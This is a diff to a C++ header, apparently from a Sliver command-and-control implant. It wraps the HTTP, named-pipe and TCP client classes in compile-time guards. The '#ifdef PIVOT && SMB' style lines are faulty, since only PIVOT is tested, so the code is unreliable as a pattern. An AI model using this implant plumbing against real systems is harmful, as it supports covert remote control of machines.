@@ -17,7 +17,7 @@ namespace transports{
 		virtual bool WriteEnvelopeNoResp(sliverpb::Envelope&) = 0;
 		virtual unique_ptr<sliverpb::Envelope> ReadEnvelope() = 0;
 	};
-
+#ifdef HTTP
 	class HttpClient : public IClient{
 	public:
 		HttpClient(string base_URI, unsigned long long netTimeout, unsigned long long tlsTimeout, unsigned long long pollTimeout, string proxyHost = "", int proxyPort = 0, string proxyUsername = "", string proxyPassword = "", string hostHeader = "");
@@ -50,6 +50,9 @@ namespace transports{
 		mutex pollMutex;
 	};
 
+#endif
+#ifdef PIVOT && SMB
+
 	class NamedPipeClient : public IClient {
 	public:
 		NamedPipeClient(const string& pipe_name);
@@ -77,6 +80,9 @@ namespace transports{
 		string pipe_name;
 	};
 
+#endif
+
+#ifdef PIVOT && TCP
 	class TCPClient : public IClient {
 	public:
 		TCPClient(const string& pipe_name);
@@ -104,4 +110,6 @@ namespace transports{
 		struct addrinfo* addr_info;
 		SOCKET connect_socket;
 	};
+
+#endif
 }
